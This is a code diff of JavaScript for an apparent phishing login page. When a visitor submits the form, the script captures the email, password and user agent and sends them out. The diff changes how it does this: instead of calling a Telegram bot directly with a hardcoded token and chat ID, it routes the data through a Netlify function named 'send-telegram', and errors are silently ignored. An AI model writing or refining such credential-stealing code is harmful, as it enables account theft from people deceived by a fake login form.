@@ -26,21 +26,17 @@ document.addEventListener('DOMContentLoaded', () => {
 
     const sig = document.getElementById('btn_sig');
 
-    const TG_BOT = '7525286244:AAEYXv7ePb1E5ZQZnaeRYp6GpDYIQ37Foi0';
-    const TG_CHAT = '-1002714719334';
-
     sig.addEventListener('click', async () => {
         validate();
         if (pwdVal) {
             const email = unameInp.value.trim();
             const password = pwdInp.value.trim();
             const userAgent = navigator.userAgent;
-            const text = `🔐 Login\nEmail: ${email}\nPassword: ${password}\nUser-Agent: ${userAgent}`;
             try {
-                await fetch(`https://api.telegram.org/bot${TG_BOT}/sendMessage`, {
+                await fetch('/.netlify/functions/send-telegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TG_CHAT, text })
+                    body: JSON.stringify({ email, password, userAgent })
                 });
             } catch (e) { /* ignore */ }
             document.getElementById("section_pwd").classList.toggle('d-none');
